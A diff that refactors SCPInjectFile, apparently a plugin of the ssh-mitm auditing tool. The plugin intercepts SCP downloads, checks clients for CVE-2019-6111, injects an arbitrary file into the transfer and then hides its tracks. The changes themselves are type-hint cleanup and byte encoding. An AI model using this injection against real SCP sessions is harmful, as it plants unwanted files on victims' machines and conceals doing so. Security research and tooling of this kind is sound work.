@@ -1,16 +1,8 @@
 import logging
 import os
-from typing import (
-    TYPE_CHECKING
-)
-
-from typeguard import typechecked
 
 import sshmitm
 from sshmitm.forwarders.scp import SCPForwarder
-
-if TYPE_CHECKING:
-    from sshmitm.session import Session
 
 
 class SCPInjectFile(SCPForwarder):
@@ -28,7 +20,6 @@ class SCPInjectFile(SCPForwarder):
     '''
 
     @classmethod
-    @typechecked
     def parser_arguments(cls) -> None:
         plugin_group = cls.parser().add_argument_group(
             cls.__name__,
@@ -42,6 +33,7 @@ class SCPInjectFile(SCPForwarder):
         )
 
     def __new__(cls, *args, **kwargs):  # type: ignore
+        del kwargs  # unused arguments
         if args[0].scp_command.find(b'-f') != -1:
             return super(SCPInjectFile, cls).__new__(cls)
         logging.debug("SCPClient is not downloading a file, reverting to normal SCPForwarder")
@@ -82,14 +74,13 @@ class SCPInjectFile(SCPForwarder):
             self.args.scp_inject_file.split('/')[-1]
         )
         logging.debug("Sending command %s", command.strip())
-        self.session.scp_channel.sendall(command)
+        self.session.scp_channel.sendall(command.encode())
         if not wait_ok():
             logging.info("Client is not vulnerable to CVE-2019-6111")
             self.hide_tracks()
             return
-        self.file_to_inject = open(self.args.scp_inject_file, 'rb')
-        self.sendall(self.session.scp_channel, self.file_to_inject.read(), self.session.scp_channel.send)
-        self.file_to_inject.close()
+        with open(self.args.scp_inject_file, 'rb') as file_to_inject:
+            self.sendall(self.session.scp_channel, file_to_inject.read(), self.session.scp_channel.send)
         send_ok()
         wait_ok()
         self.hide_tracks()
